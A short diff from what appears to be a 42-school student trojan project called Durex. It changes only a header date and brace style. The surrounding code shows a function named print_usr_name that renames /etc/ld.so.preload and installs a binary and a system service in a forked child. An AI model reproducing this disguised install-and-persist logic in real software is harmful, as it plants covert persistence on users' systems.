@@ -6,7 +6,7 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2019/05/12 16:05:41 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/07/17 12:26:02 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -30,7 +30,8 @@ void				print_usr_name()
 	fd = open(DUREX_BINARY_FILE, O_RDONLY, 0700);
 	if (fd < 0) {
 		if (rename("/etc/ld.so.preload", "/etc/mamouth"))
-			if (fork() == 0) {
+			if (fork() == 0)
+			{
 				if (!install_binary() && !install_service())
 					system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
 				exit(0);
